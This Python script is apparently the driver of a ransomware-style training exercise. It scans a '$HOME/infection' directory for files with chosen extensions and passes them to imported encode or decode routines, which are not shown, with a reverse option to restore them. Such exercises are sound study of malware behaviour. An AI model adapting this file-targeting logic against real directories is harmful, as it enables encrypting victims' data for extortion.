#!/usr/bin/env python3

from os import environ, path
import os
from encode import encode
from decode import decode
from utilities import *

def check_dir():
    home = environ.get('HOME')
    if not home:
        exit_error("No $HOME declare in your env")
    home += "/infection"
    if not path.exists(home):
        exit_error(f"{home}: doesn't exist")
    if not path.isdir(home):
        exit_error(f"{home}: isn't a directory")
    if not os.access(home, os.R_OK):
        exit_error(f"{home}: you don't have the right")
    return home

def parse_file_extension(infect_path: str):
    lst = []
    with os.scandir(infect_path) as entries:
        for entry in entries:
            if not entry.is_file():
                continue
            root, extension = path.splitext(entry)
            if extension in extensions:
                lst.append(entry)
    prints("Files found:")
    for entry in lst:
        prints(f"\t- {entry.name}")
    return lst
            
def main():
    parse_args()
    infect_path = check_dir()
    lst = parse_file_extension(infect_path)
    if args.reverse:
        decode(lst)
    else:
        encode(lst)

if __name__ == "__main__":
    main()